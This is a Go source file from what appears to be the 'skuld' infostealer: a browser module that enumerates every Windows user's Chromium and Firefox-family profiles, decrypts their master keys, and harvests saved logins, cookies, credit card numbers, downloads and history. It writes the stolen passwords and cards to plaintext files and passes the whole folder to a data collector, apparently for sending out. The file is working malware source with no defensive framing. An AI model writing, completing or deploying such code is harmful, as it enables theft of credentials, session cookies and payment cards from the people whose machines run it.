package browsers

import (
	"fmt"
	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
	"os"
	"path/filepath"
	"strings"
)

func ChromiumSteal() []Profile {
	var prof []Profile
	for _, user := range hardware.GetUsers() {
		for name, path := range GetChromiumBrowsers() {
			path = filepath.Join(user, path)
			if !fileutil.IsDir(path) {
				continue
			}

			browser := Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			var profilesPaths []Profile
			if strings.Contains(path, "Opera") {
				profilesPaths = append(profilesPaths, Profile{
					Name:    "Default",
					Path:    browser.Path,
					Browser: browser,
				})

			} else {
				folders, err := os.ReadDir(path)
				if err != nil {
					continue
				}
				for _, folder := range folders {
					if folder.IsDir() {
						dir := filepath.Join(path, folder.Name())
						if fileutil.Exists(filepath.Join(dir, "Web Data")) {
							profilesPaths = append(profilesPaths, Profile{
								Name:    folder.Name(),
								Path:    dir,
								Browser: browser,
							})
						}

					}
				}
			}

			if len(profilesPaths) == 0 {
				continue
			}

			c := Chromium{}
			err := c.GetMasterKey(path)
			if err != nil {
				continue
			}
			for _, profile := range profilesPaths {
				profile.Logins, _ = c.GetLogins(profile.Path)
				profile.Cookies, _ = c.GetCookies(profile.Path)
				profile.CreditCards, _ = c.GetCreditCards(profile.Path)
				profile.Downloads, _ = c.GetDownloads(profile.Path)
				profile.History, _ = c.GetHistory(profile.Path)
				prof = append(prof, profile)
			}

		}
	}
	return prof
}

func GeckoSteal() []Profile {
	var prof []Profile
	for _, user := range hardware.GetUsers() {
		for name, path := range GetGeckoBrowsers() {
			path = filepath.Join(user, path)
			if !fileutil.IsDir(path) {
				continue
			}

			browser := Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			var profilesPaths []Profile

			profiles, err := os.ReadDir(path)
			if err != nil {
				continue
			}
			for _, profile := range profiles {
				if !profile.IsDir() {
					continue
				}
				dir := filepath.Join(path, profile.Name())
				files, err := os.ReadDir(dir)
				if err != nil {
					continue
				}
				if len(files) <= 10 {
					continue
				}

				profilesPaths = append(profilesPaths, Profile{
					Name:    profile.Name(),
					Path:    dir,
					Browser: browser,
				})
			}

			if len(profilesPaths) == 0 {
				continue
			}

			for _, profile := range profilesPaths {
				g := Gecko{}
				g.GetMasterKey(profile.Path)
				profile.Logins, _ = g.GetLogins(profile.Path)
				profile.Cookies, _ = g.GetCookies(profile.Path)
				profile.Downloads, _ = g.GetDownloads(profile.Path)
				profile.History, _ = g.GetHistory(profile.Path)
				prof = append(prof, profile)
			}

		}
	}
	return prof
}

func Run(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "browsers-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	var profiles []Profile
	profiles = append(profiles, ChromiumSteal()...)
	profiles = append(profiles, GeckoSteal()...)

	if len(profiles) == 0 {
		return
	}

	// Create a separate passwords file
	passwordsFile := filepath.Join(tempDir, "ALL_PASSWORDS.txt")
	fileutil.AppendFile(passwordsFile, "=== ALL EXTRACTED PASSWORDS ===\n")
	fileutil.AppendFile(passwordsFile, fmt.Sprintf("%-50s %-30s %-30s %-20s", "URL", "Username", "Password", "Browser"))

	totalLogins := 0
	totalCookies := 0
	totalCards := 0

	for _, profile := range profiles {
		if len(profile.Logins) == 0 && len(profile.Cookies) == 0 && len(profile.CreditCards) == 0 && len(profile.Downloads) == 0 && len(profile.History) == 0 {
			continue
		}
		
		profileDir := filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name)
		os.MkdirAll(profileDir, os.ModePerm)

		if len(profile.Logins) > 0 {
			loginsFile := filepath.Join(profileDir, "logins.txt")
			fileutil.AppendFile(loginsFile, fmt.Sprintf("%-50s %-50s %-50s", "URL", "Username", "Password"))
			
			for _, login := range profile.Logins {
				loginLine := fmt.Sprintf("%-50s %-50s %-50s", login.LoginURL, login.Username, login.Password)
				fileutil.AppendFile(loginsFile, loginLine)
				
				// Add to master passwords file
				passwordLine := fmt.Sprintf("%-50s %-30s %-30s %-20s", login.LoginURL, login.Username, login.Password, profile.Browser.Name)
				fileutil.AppendFile(passwordsFile, passwordLine)
				totalLogins++
			}
		}

		if len(profile.Cookies) > 0 {
			cookiesFile := filepath.Join(profileDir, "cookies.txt")
			for _, cookie := range profile.Cookies {
				var expires string
				if cookie.ExpireDate == 0 {
					expires = "FALSE"
				} else {
					expires = "TRUE"
				}

				var host string
				if strings.HasPrefix(cookie.Host, ".") {
					host = "FALSE"
				} else {
					host = "TRUE"
				}

				cookieLine := fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s", cookie.Host, expires, cookie.Path, host, cookie.ExpireDate, cookie.Name, cookie.Value)
				fileutil.AppendFile(cookiesFile, cookieLine)
				totalCookies++
			}
		}

		if len(profile.CreditCards) > 0 {
			cardsFile := filepath.Join(profileDir, "credit_cards.txt")
			fileutil.AppendFile(cardsFile, fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", "Number", "Expiration Month", "Expiration Year", "Name", "Address"))
			
			for _, cc := range profile.CreditCards {
				cardLine := fmt.Sprintf("%-30s %-30s %-30s %-30s %-30s", cc.Number, cc.ExpirationMonth, cc.ExpirationYear, cc.Name, cc.Address)
				fileutil.AppendFile(cardsFile, cardLine)
				totalCards++
			}
		}

		if len(profile.Downloads) > 0 {
			downloadsFile := filepath.Join(profileDir, "downloads.txt")
			fileutil.AppendFile(downloadsFile, fmt.Sprintf("%-70s %-70s", "Target Path", "URL"))
			
			for _, download := range profile.Downloads {
				downloadLine := fmt.Sprintf("%-70s %-70s", download.TargetPath, download.URL)
				fileutil.AppendFile(downloadsFile, downloadLine)
			}
		}

		if len(profile.History) > 0 {
			historyFile := filepath.Join(profileDir, "history.txt")
			fileutil.AppendFile(historyFile, fmt.Sprintf("%-70s %-70s", "Title", "URL"))
			
			for _, history := range profile.History {
				historyLine := fmt.Sprintf("%-70s %-70s", history.Title, history.URL)
				fileutil.AppendFile(historyFile, historyLine)
			}
		}
	}

	// Add summary to passwords file
	fileutil.AppendFile(passwordsFile, fmt.Sprintf("\n\n=== SUMMARY ===\nTotal Logins: %d\nTotal Cookies: %d\nTotal Credit Cards: %d", totalLogins, totalCookies, totalCards))

	// Add browsers data to collector
	browsersInfo := map[string]interface{}{
		"TotalLogins":     totalLogins,
		"TotalCookies":    totalCookies,
		"TotalCreditCards": totalCards,
		"ProfilesFound":   len(profiles),
		"TreeView":        fileutil.Tree(tempDir, ""),
	}
	dataCollector.AddData("browsers", browsersInfo)
	dataCollector.AddDirectory("browsers", tempDir, "browsers_data")
}